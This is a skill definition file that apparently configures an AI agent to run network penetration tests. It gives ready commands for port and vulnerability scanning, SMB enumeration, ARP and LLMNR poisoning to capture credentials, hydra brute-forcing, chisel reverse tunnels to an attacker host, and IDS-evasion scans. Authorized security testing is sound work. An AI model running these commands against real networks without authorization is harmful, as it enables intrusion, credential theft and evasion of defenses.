---
name: network-offensive
description: |
  Network offensive testing engine for external and internal network assessments. Covers port
  scanning, service fingerprinting, vulnerability scanning, network protocol exploitation 
  (SMB, RDP, FTP, SNMP, DNS), wireless attacks, pivoting & tunneling, and firewall/IDS evasion.
  Maps findings to MITRE ATT&CK (Discovery, Lateral Movement, Exfiltration tactics) and
  NIST SP 800-115. Integrates nmap, Metasploit, Responder, Bettercap, and Wireshark/tshark.
metadata:
  {
    "openclaw":
      {
        "emoji": "🌐",
        "requires":
          {
            "bins": ["nmap", "python3"],
            "optional": ["metasploit", "responder", "bettercap", "masscan"],
          },
        "install":
          [
            {
              "id": "brew-nmap",
              "kind": "brew",
              "formula": "nmap",
              "bins": ["nmap"],
              "label": "Install Nmap (brew)",
            },
            {
              "id": "brew-masscan",
              "kind": "brew",
              "formula": "masscan",
              "bins": ["masscan"],
              "label": "Install Masscan (brew)",
            },
            {
              "id": "brew-bettercap",
              "kind": "brew",
              "formula": "bettercap",
              "bins": ["bettercap"],
              "label": "Install Bettercap (brew)",
            },
          ],
      },
  }
---

# Network Offensive Testing Skill

Comprehensive network penetration testing engine for full-scope internal and external assessments.

## Capabilities

### 1. Network Discovery & Port Scanning

High-speed network discovery and comprehensive port/service enumeration.

**Usage:**

> Perform full network discovery and port scanning against 192.168.1.0/24

**Tools:** `nmap`, `masscan`

**Commands:**

```bash
# Fast host discovery
nmap -sn 192.168.1.0/24 -oG hosts.txt

# Full port scan
nmap -sV -sC -p- --min-rate 5000 TARGET_IP -oA full_scan

# Ultra-fast with masscan then nmap detail
masscan TARGET_CIDR -p1-65535 --rate 10000 -oL ports.txt
```

**References:** MITRE ATT&CK: T1046 (Network Service Discovery)

---

### 2. Service Vulnerability Scanning

Automated detection of exploitable vulnerabilities in network services.

**Usage:**

> Scan 192.168.1.10 for known vulnerabilities in running services

**Tools:** `nmap` (--script vuln), `nuclei` (network templates)

**Commands:**

```bash
nmap --script vuln -p 21,22,23,25,80,443,445,3389 TARGET_IP
nuclei -u TARGET_IP -t network/ -severity critical,high
```

**References:** NIST SP 800-115, MITRE ATT&CK: T1190

---

### 3. SMB Protocol Exploitation

Test for SMBv1 EternalBlue, null session, credential attacks, and share enumeration.

**Usage:**

> Test the SMB service at 192.168.1.10 for vulnerabilities

**Tests:**

- EternalBlue (MS17-010)
- Null session access
- Username/password spray
- Share permission enumeration

**Commands:**

```bash
nmap --script smb-vuln-ms17-010 -p 445 TARGET_IP
crackmapexec smb TARGET_IP -u '' -p '' --shares
```

**References:** MITRE ATT&CK: T1210 (Exploitation of Remote Services)

---

### 4. Man-in-the-Middle (MITM) Attacks

Intercept network traffic to steal credentials, inject payloads, or downgrade encryption.

**Usage:**

> Perform MITM attack on the 192.168.1.0/24 network (authorized lab use only)

**Attacks:**

- ARP poisoning
- LLMNR/NBT-NS poisoning (Responder)
- HTTPS downgrade / SSL stripping

**Tools:** `responder`, `bettercap`

**Commands:**

```bash
python3 Responder.py -I eth0 -wrf
bettercap -iface eth0 -eval "set arp.spoof.targets TARGET; arp.spoof on; net.sniff on"
```

**References:** MITRE ATT&CK: T1557 (Adversary-in-the-Middle)

---

### 5. Credential Harvesting & Protocol Attacks

Attack insecure protocols (FTP, Telnet, SNMP v1/v2, RDP) for credential theft.

**Usage:**

> Attempt credential attacks against FTP (21), Telnet (23), SNMP (161) on target network

**Tools:** `hydra`, `medusa`, `snmpwalk`, `nmap`

**Commands:**

```bash
hydra -l admin -P passwords.txt ftp://TARGET_IP
snmpwalk -v2c -c public TARGET_IP
nmap --script rdp-enum-encryption -p 3389 TARGET_IP
```

**References:** MITRE ATT&CK: T1110 (Brute Force)

---

### 6. DNS Enumeration & Attacks

Enumerate DNS records, test for zone transfer, and identify DNS misconfigurations.

**Usage:**

> Perform comprehensive DNS enumeration for target.com

**Tests:**

- Zone transfer (AXFR)
- Subdomain brute-force
- DNS cache poisoning risk assessment
- DNSSEC validation

**Commands:**

```bash
dig @NS_IP target.com AXFR
dnsx -d target.com -w subdomains.txt -all -resp
```

**References:** MITRE ATT&CK: T1590.002

---

### 7. Network Pivoting & Tunneling

Establish tunnels through compromised hosts to reach segmented internal networks.

**Usage:**

> Set up network pivoting from compromised host 192.168.1.50 to internal network 10.0.0.0/8

**Techniques:**

- SSH tunneling / SOCKS proxies
- Chisel / ligolo-ng reverse tunnels
- Port forwarding via Metasploit

**Commands:**

```bash
ssh -D 1080 -N user@PIVOT_HOST
./chisel server --reverse --port 9001  # attacker
./chisel client ATTACKER_IP:9001 R:socks  # pivot host
```

**References:** MITRE ATT&CK: T1572 (Protocol Tunneling)

---

### 8. Firewall Evasion & IDS Bypass

Evade network security controls using fragmentation, decoys, and timing techniques.

**Usage:**

> Perform stealth scan of TARGET_IP while evading IDS/firewall

**Techniques:**

- TCP FIN/XMAS/NULL scans
- IP fragmentation
- Decoy scans
- Slow-rate scanning

**Commands:**

```bash
nmap -sF -D RND:10 -T1 --data-length 25 TARGET_IP
nmap -f --mtu 24 TARGET_IP
```

**References:** MITRE ATT&CK: T1562 (Impair Defenses)

---

## Quick Commands

| Action         | Command                                        |
| -------------- | ---------------------------------------------- |
| Host Discovery | `nmap -sn TARGET_CIDR`                         |
| Full Port Scan | `nmap -sV -p- --min-rate 5000 TARGET`          |
| Vuln Scan      | `nmap --script vuln TARGET`                    |
| SMB Test       | `crackmapexec smb TARGET -u '' -p '' --shares` |
| SNMP Enum      | `snmpwalk -v2c -c public TARGET`               |
| ARP Poison     | `bettercap -eval "arp.spoof on; net.sniff on"` |
| DNS Transfer   | `dig @NS_IP DOMAIN AXFR`                       |
